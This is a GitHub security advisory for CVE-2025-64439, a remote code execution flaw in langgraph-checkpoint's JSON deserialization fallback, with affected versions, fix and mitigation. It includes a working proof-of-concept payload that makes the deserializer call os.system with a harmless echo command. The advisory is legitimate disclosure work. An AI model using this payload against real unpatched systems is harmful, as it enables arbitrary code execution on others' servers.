# [H] LangGraph Checkpoint affected by RCE in "json" mode of JsonPlusSerializer 

## Summary
Severity: High
Advisory: GHSA-wwqv-p2pp-99h5
CVE: CVE-2025-64439
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2025-11-05
Source: https://github.com/advisories/GHSA-wwqv-p2pp-99h5
Type: github-advisory

## Affected
- PyPI: `langgraph-checkpoint` — affected >=0 <3.0.0

## Details
# Summary

Prior to `langgraph-checkpoint` version `3.0` , LangGraph’s `JsonPlusSerializer` (used as the default serialization protocol for all checkpointing) contains a remote code execution (RCE) vulnerability when deserializing payloads saved in the `"json"` serialization mode.

If an attacker can cause your application to persist a payload serialized in this mode, they may be able to also send malicious content that executes arbitrary Python code during deserialization.

Upgrading to version langgraph-checkpoint `3.0` patches this vulnerability by preventing deserialization of custom objects saved in this mode.

If you are deploying in `langgraph-api`, any version `0.5` or later is also free of this vulnerability. 

# Details

**Affected file / component**

[jsonplus.py](https://github.com/langchain-ai/langgraph/blob/c5744f583b11745cd406f3059903e17bbcdcc8ac/libs/checkpoint/langgraph/checkpoint/serde/jsonplus.py)

By default, the serializer attempts to use `"msgpack"` for serialization. However, prior to version `3.0` of the checkpointer library, if illegal Unicode surrogate values caused serialization to fail,  it would fall back to using the `"json"` mode.

When operating in this mode, the deserializer supports a constructor-style format (`lc == 2`, `type == "constructor"`) for custom objects to allow them to be reconstructed at load time.  If an attacker is able to trigger this mode with a malicious payload, deserializing  allow the attacker to execute arbitrary functions upon load.

---

# Who is affected

This issue affects all users of `langgraph-checkpoint` **versions earlier than 3.0** who:

1. Allow untrusted or user-supplied data to be persisted into checkpoints, and
2. Use the default serializer (or explicitly instantiate `JsonPlusSerializer`) that may fall back to `"json"` mode.

If your application only processes trusted data or does not allow untrusted checkpoint writes, the practical risk is reduced.

# Proof of Concept (PoC)

```python
from langgraph.graph import StateGraph 
from typing import TypedDict
from langgraph.checkpoint.sqlite import SqliteSaver

class State(TypedDict):
    foo: str
    attack: dict

def my_node(state: State):
    return {"foo": "oops i fetched a surrogate \ud800"}

with SqliteSaver.from_conn_string("foo.db") as saver:
    graph = (
	    StateGraph(State).
	    add_node("my_node", my_node).
	    add_edge("__start__", "my_node").
	    compile(checkpointer=saver)
	 )
    

    attack = {
        "lc": 2,
        "type": "constructor",
        "id": ["os", "system"],
        "kwargs": {"command": "echo pwnd you > /tmp/pwnd.txt"},
    }
    malicious_payload = {
         "attack": attack,
    }

    thread_id = "00000000-0000-0000-0000-000000000001"
    config = {"thread_id": thread_id}
    # Malicious payload is saved in the first call
    graph.invoke(malicious_payload, config=config)

    # Malicious payload is deserialized and code is executed in the second call
    graph.invoke({"foo": "hi there"}, config=config)

```

Running this PoC writes a file `/tmp/pwnd.txt` to disk, demonstrating code execution.

Internally, this exploits the following code path:

```python
from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer

serializer = JsonPlusSerializer() # Used within the checkpointer

serialized = serializer.dumps_typed(malicious_payload)
serializer.loads_typed(serialized)  # Executes os.system(...)

```

---

# Fixed Version

The vulnerability is fixed in **`langgraph-checkpoint==3.0.0`**

Release link: https://github.com/langchain-ai/langgraph/releases/tag/checkpoint%3D%3D3.0.0

---

# Fix Description

The fix introduces an **allow-list** for constructor deserialization, restricting permissible `"id"` paths to explicitly approved module/class combinations provided at serializer construction.

Additionally, saving payloads in `"json"` format has been deprecated to remove this unsafe fallback path.

---

# Mitigation

Upgrade immediately to `langgraph-checkpoint==3.0.0`.

This version is fully compatible with `langgraph>=0.3` and does **not** require any import changes or code modifications.

In `langgraph-api`, updating to `0.5` or later will automatically require the patched version of the checkpointer library.

## References
- https://github.com/langchain-ai/langgraph/security/advisories/GHSA-wwqv-p2pp-99h5
- https://nvd.nist.gov/vuln/detail/CVE-2025-64439
- https://github.com/langchain-ai/langgraph/commit/c5744f583b11745cd406f3059903e17bbcdcc8ac
- https://github.com/langchain-ai/langgraph
- https://github.com/langchain-ai/langgraph/blob/c5744f583b11745cd406f3059903e17bbcdcc8ac/libs/checkpoint/langgraph/checkpoint/serde/jsonplus.py
- https://github.com/langchain-ai/langgraph/releases/tag/checkpoint%3D%3D3.0.0
